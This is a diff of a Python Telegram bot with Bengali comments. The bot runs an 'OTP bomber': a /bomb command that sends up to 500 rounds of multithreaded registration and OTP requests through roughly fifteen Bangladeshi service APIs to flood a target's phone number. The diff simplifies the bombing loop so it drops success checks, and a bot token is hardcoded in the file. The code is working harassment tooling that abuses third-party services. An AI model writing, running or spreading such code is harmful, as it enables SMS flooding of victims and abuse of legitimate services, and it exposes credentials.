@@ -8,7 +8,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from concurrent.futures import ThreadPoolExecutor
 
-BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # আপনার টোকেন
+BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"
 OWNER_ID = 1700797877
 authorized_groups = set()
 
@@ -49,7 +49,7 @@ def send_req(url, method, headers, data=None):
     except:
         return None
 
-# =================== api_1 to api_15 ===================
+# =================== API 1-15 (পূর্ণ) ===================
 def api_1(number, pgen, egen, did, name):
     url = "https://core.easy.com.bd/api/v1/registration"
     headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "core.easy.com.bd", "User-Agent": "okhttp/3.9.1"}
@@ -140,27 +140,22 @@ def api_15(number):
     data = {"msisdn": number[1:]}
     return send_req(url, "POST", headers, data)
 
-# =================== বোম্বিং ফাংশন ===================
-def run_bombing_with_progress(number, rounds, chat_id):
-    # সবগুলো API ফাংশন (যেগুলো শুধু number নেয়)
+# =================== বোম্বিং ফাংশন (শুধু রাউন্ড দেখাবে) ===================
+def run_bombing_simple(number, rounds, chat_id):
     apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15]
-    total_success = 0
     for round_num in range(1, rounds + 1):
         pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
         egen = random_string("?n?n?n?n?n?n?n?n")
         did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
         name = random_string("?l?l?l?l?l?l")
-        round_success = 0
         with ThreadPoolExecutor(max_workers=50) as ex:
             futures = [ex.submit(api_1, number, pgen, egen, did, name), ex.submit(api_10, number, pgen, egen, name)]
             futures.extend(ex.submit(api, number) for api in apis)
             for f in futures:
-                r = f.result()
-                if r and r.status_code == 200:
-                    round_success += 1
-        total_success += round_success
-        send_message_sync(chat_id, f"✅ Round {round_num}: {round_success} successes (Total so far: {total_success})")
-    return total_success
+                f.result()  # আমরা ফলাফল চেক করছি না, শুধু রান করাচ্ছি
+        # প্রতি রাউন্ড শেষে একটি মেসেজ পাঠান
+        send_message_sync(chat_id, f"✅ Bomb {round_num} sent.")
+    return rounds
 
 # =================== টেলিগ্রাম কমান্ড ===================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -169,7 +164,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/bomb <number> [rounds] – Send OTP bomb\n"
         "Example: `/bomb 01712345678`\n"
         "Example: `/bomb 01712345678 50`\n\n"
-        "👑 Owner commands:\n/authgroup, /unauthgroup, /listgroups",
+        "👑 Owner commands: /authgroup, /unauthgroup, /listgroups",
         parse_mode="Markdown"
     )
 
@@ -177,7 +172,6 @@ async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     chat_id = update.effective_chat.id
     chat_type = update.effective_chat.type
-    user_id = update.effective_user.id
 
     if chat_type != "private" and chat_id not in authorized_groups:
         await update.message.reply_text(f"❌ This group not authorized. ID: `{chat_id}`", parse_mode="Markdown")
@@ -196,14 +190,15 @@ async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if rounds > 500:
             rounds = 500
             await update.message.reply_text("⚠️ Max 500 rounds per command.")
-    await update.message.reply_text(f"💣 Bombing `{number}` with {rounds} round(s)...\n_Progress will appear here_", parse_mode="Markdown")
+    await update.message.reply_text(f"💣 Bombing `{number}` with {rounds} round(s)...", parse_mode="Markdown")
 
     def do_bomb():
-        total = run_bombing_with_progress(number, rounds, chat_id)
-        send_message_sync(chat_id, f"🎉 **Done!** {total} successful requests sent to `{number}`.")
+        total_rounds = run_bombing_simple(number, rounds, chat_id)
+        send_message_sync(chat_id, f"🎉 All {total_rounds} bombs sent successfully!")
 
     threading.Thread(target=do_bomb).start()
 
+# অন্যান্য কমান্ড (authgroup, unauthgroup, listgroups) আগের মতোই থাকবে
 async def authgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("Unauthorized.")
